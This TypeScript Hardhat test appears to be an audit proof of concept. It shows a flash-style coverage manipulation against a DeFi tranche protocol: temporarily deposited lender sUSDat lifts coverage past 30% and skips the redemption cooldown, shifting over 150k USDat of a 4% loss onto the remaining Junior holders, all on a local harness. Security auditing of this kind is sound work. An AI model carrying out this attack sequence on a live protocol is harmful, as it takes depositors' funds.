import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';
import { MockStakedUSDat } from '@0xc/hardhat/MockStakedUSDat/MockStakedUSDat';

/**
 * Current-Saturn-sized economic PoC for the transient JRT coverage bypass.
 *
 * The state is intentionally sized near the public Saturn tranche TVLs observed
 * during the audit (~1.76m Junior / ~7.47m Senior), while still using only the
 * local Strata Saturn harness. No live protocol state or funds are touched.
 *
 * The attacker already owns 1.15m JRT. At ~23.6% initial coverage that position
 * belongs to Saturn's protected 7-day tier. Existing lender-owned sUSDat is
 * temporarily deposited as JRT, both old and temporary JRT independently redeem
 * while coverage is >30%, the exact sUSDat loan is repaid, then the same global
 * 4% sUSDat backing loss occurs in both worlds.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('saturn');

const {
    jrtVault,
    srtVault,
    cdo,
} = await test.deploy({ initialDeposit: false });
const { base, sUSDat } = await test.factory.ensureUnderlying();
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
const { deployer } = test;
const mockSUSDat = new MockStakedUSDat(sUSDat.address, sUSDat.client);

const JUNIOR_SEED = 1_760_000;
const SENIOR_SEED = 7_470_000;
const OLD_ATTACKER_JRT = 1_150_000;
const TEMP_LOAN_VALUE = 1_700_000n * 10n ** 6n;

// Ordinary LP establishes the pool, then the attacker acquires pre-existing JRT.
await $erc20.mint(base, deployer, liquidityProvider, JUNIOR_SEED + SENIOR_SEED);
await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, JUNIOR_SEED);
await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, SENIOR_SEED);
await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, OLD_ATTACKER_JRT);

// Existing lender capital is created before either comparison world begins.
const loanShares = await sUSDat.convertToShares(TEMP_LOAN_VALUE);
await $erc4626.mint(sUSDat as any, lender, loanShares);
$require.eq(await sUSDat.balanceOf(lender.address), loanShares);

const coverageT0 = Number(await cdo.coverage());
$require.gt(coverageT0, 150_000);
$require.lt(coverageT0, 300_000);

await test.snapshot('transient-coverage-saturn-live-scale');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-saturn-live-scale');
    },

    async 'current-sized state shifts >150k USDat of a matched 4% loss to remaining Junior' () {
        // ---------------- Control: protected JRT stays locked ----------------
        let oldShares = await jrtVault.balanceOf(attacker.address);
        let lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        const controlImmediate = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.eq(controlImmediate, 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');
        await sharesCooldown.$receipt().finalize(
            attacker,
            jrtVault.address,
            sUSDat.address,
            attacker.address,
        );

        const controlUnits = await sUSDat.balanceOf(attacker.address);
        const controlValue = await sUSDat.convertToAssets(controlUnits);
        const controlLpValue = await jrtVault.convertToAssets(lpShares);

        // ---------------- Attack: manufacture >30% coverage ----------------
        await test.reset('transient-coverage-saturn-live-scale');

        oldShares = await jrtVault.balanceOf(attacker.address);
        lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);

        const coverageBoosted = Number(await cdo.coverage());
        $require.gt(coverageBoosted, 300_000);

        const oldAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.gt(oldAssetsOut, 0n);

        // The second redemption independently sees the zero-lock tier too.
        const coverageAfterOldExit = Number(await cdo.coverage());
        $require.gt(coverageAfterOldExit, 300_000);

        const temporaryShares = await jrtVault.balanceOf(attacker.address);
        const temporaryAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            temporaryShares,
        );
        $require.gt(temporaryAssetsOut, 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        // The attacker has driven Junior close to, but still above, Saturn's 7.5%
        // hard floor; the temporary >30% coverage no longer exists.
        const coverageAfterUnwind = Number(await cdo.coverage());
        $require.gt(coverageAfterUnwind, 75_000);
        $require.lt(coverageAfterUnwind, 100_000);

        // Return the exact temporary strategy-token units before the loss.
        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);

        // Same global backing loss and same time horizon as control.
        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');

        const attackUnits = await sUSDat.balanceOf(attacker.address);
        const attackValue = await sUSDat.convertToAssets(attackUnits);
        const attackLpValue = await jrtVault.convertToAssets(lpShares);

        const attackerAdvantage = attackValue - controlValue;
        const remainingJrtVictimLoss = controlLpValue - attackLpValue;

        console.log('live-scale initial coverage ppm', coverageT0.toString());
        console.log('live-scale boosted coverage ppm', coverageBoosted.toString());
        console.log('live-scale after-old-exit coverage ppm', coverageAfterOldExit.toString());
        console.log('live-scale final coverage ppm', coverageAfterUnwind.toString());
        console.log('live-scale control attacker value', controlValue.toString());
        console.log('live-scale attack attacker value', attackValue.toString());
        console.log('live-scale attacker advantage', attackerAdvantage.toString());
        console.log('live-scale control remaining-JRT value', controlLpValue.toString());
        console.log('live-scale attack remaining-JRT value', attackLpValue.toString());
        console.log('live-scale remaining-JRT victim loss', remainingJrtVictimLoss.toString());

        // Six decimals: require a six-figure economic differential.
        $require.gt(attackerAdvantage, 150_000n * 10n ** 6n);
        $require.gt(remainingJrtVictimLoss, 150_000n * 10n ** 6n);

        // Same root transfer; allow a small relative residual for configured fees.
        const diff = attackerAdvantage > remainingJrtVictimLoss
            ? attackerAdvantage - remainingJrtVictimLoss
            : remainingJrtVictimLoss - attackerAdvantage;
        $require.lt(diff, 20_000n * 10n ** 6n);
    },
});

async function applyGlobalFourPercentSUSDatLoss () {
    const backingBefore = await mockSUSDat.usdatBalance();
    $require.gt(backingBefore, 0n);
    await mockSUSDat.$receipt().setUsdatBalance(
        deployer,
        backingBefore * 96n / 100n,
    );
}
